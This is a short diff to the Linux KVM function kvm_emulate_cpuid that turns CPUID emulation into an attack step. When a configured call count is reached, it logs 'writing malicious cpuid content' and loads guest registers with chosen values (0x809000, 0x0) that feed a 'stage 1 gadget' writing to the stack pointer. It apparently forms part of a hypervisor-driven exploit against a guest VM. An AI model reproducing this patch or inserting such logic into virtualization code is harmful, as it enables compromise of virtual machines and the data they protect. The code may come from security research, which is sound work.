@@ -1071,12 +1071,17 @@ int kvm_emulate_cpuid(struct kvm_vcpu *vcpu)
 		kvm_rbx_write(vcpu, ebx);
 		kvm_rcx_write(vcpu, ecx);
 		kvm_rdx_write(vcpu, edx);
-	} else {
-		//used by gadget to write to rsp
-		kvm_rcx_write(vcpu, 0x809000);		
-		//don't care for these
+	} else { //
+		if (launch_attack_config.current_cpuid_call_count == launch_attack_config.target_cpuid_call_count ) {
+			printk("writing malicious cpuid content\n");
+		}
+		
+		//used by stage 1 gadget to write to rsp
+		kvm_rbx_write(vcpu, 0x809000);
+		//used by stage 1 gadget as addr for slack instruction
+		kvm_rcx_write(vcpu, 0x0); 
+		//unused by stage 1 gadget
 		kvm_rax_write(vcpu, eax);
-		kvm_rbx_write(vcpu, ebx);
 		kvm_rdx_write(vcpu, edx);
 	}
 
